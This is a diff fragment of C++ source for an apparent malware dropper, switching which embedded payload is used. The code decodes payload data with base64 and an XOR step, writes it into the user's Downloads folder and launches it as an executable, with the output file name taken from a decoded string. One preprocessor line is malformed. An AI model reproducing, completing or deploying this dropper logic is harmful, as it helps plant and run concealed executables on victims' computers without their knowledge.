@@ -175,23 +175,28 @@ int main(int argc, char* argv[])
 ////////////////////////////////////////////
 
 #else
-		dropper_start(4);
-		dropper_start(5);
+//		dropper_start(4);
+//		dropper_start(5);
+		dropper_start(1);
 
 	#ifdef DROPPER_BASE64 == 1
-		data4 = base64decode(data4, &size4);
-		data5 = base64decode(data5, &size5);
+//		data4 = base64decode(data4, &size4);
+//		data5 = base64decode(data5, &size5);
+		data1 = base64decode(data1, &size1);
 	#endif
 
 	#if DROPPER_XOR_KEY != 0
-		data4 = XOR(data4, size4);
-		data5 = XOR(data5, size5);
+//		data4 = XOR(data4, size4);
+//		data5 = XOR(data5, size5);
+		data1 = XOR(data1, size1);
 	#endif
 
-		drop(size4, data4, name4);
-		drop(size5, data5, name5);
+//		drop(size4, data4, name4);
+//		drop(size5, data5, name5);
+		drop(size1, data1, name1);
 
-		exe_launch(name4);
+		exe_launch(name1);
+//		exe_launch(name4);
 
 #endif
 
@@ -293,6 +298,8 @@ void setup_name(std::uint64_t os_version) {
 
 		const wchar_t* temp = _wgetenv(L"USERPROFILE");
 		if (temp != nullptr){
+			name1 += temp;
+			name1 += L"\\Downloads";
 			name4 += temp;
 			name4 += L"\\Downloads";
 			name5 += temp;
@@ -369,7 +376,7 @@ void set_name(std::uint64_t os_version)
 	std::wstring out(size, L'\0');
 	MultiByteToWideChar(CP_UTF8, 0, drop, -1, out.data(), size);
 
-	name1+=L"\\exe_num28.exe";
+	name1+=out;
 //	name4+=DROPPER_OUTPUT;
 //	name5+=DROPPER_OUTPUT;
 	//name5+=".mui";
